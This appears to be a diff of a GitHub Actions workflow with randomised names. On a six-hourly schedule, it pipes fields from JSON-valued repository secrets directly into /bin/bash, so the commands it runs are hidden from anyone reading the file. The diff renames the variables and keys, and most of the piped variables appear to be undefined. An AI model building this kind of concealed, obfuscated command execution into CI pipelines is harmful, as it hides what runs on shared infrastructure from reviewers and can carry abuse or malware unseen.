@@ -1,26 +1,22 @@
 name: chenjinzhisuo
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 2/6 * * *'
-jobs:  # 514
+    - cron: '6 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chenjinzhisuo
         env:
-          qcvci915: ${{ secrets.qcvci915 }}
+          ely33: ${{ secrets.ely33 }}
         run: |
-          echo $qcvci915 | jq -r .v5377 | /bin/bash
-          echo $rdto0984 | jq -r .cef0 | /bin/bash
-          echo $zr8142 | jq -r .bpd17898 | /bin/bash
-          echo $zsjb97339 | jq -r .h3 | /bin/bash
-          echo $qy090 | jq -r .u319 | /bin/bash
-          echo $ulte6978 | jq -r .g034 | /bin/bash
-          echo $jxv4039 | jq -r .ckwoo380 | /bin/bash
-          echo $vdyp40 | jq -r .i97 | /bin/bash
-          echo $f8 | jq -r .qw074 | /bin/bash
-          echo $llr29 | jq -r .oj19474 | /bin/bash
+          echo $ely33 | jq -r .sn4168 | /bin/bash
+          echo $xjag97 | jq -r .a13 | /bin/bash
+          echo $ucf85449 | jq -r .v079 | /bin/bash
+          echo $ttrq93 | jq -r .sviir76032 | /bin/bash
+          echo $hxtvs72478 | jq -r .zy2 | /bin/bash
 
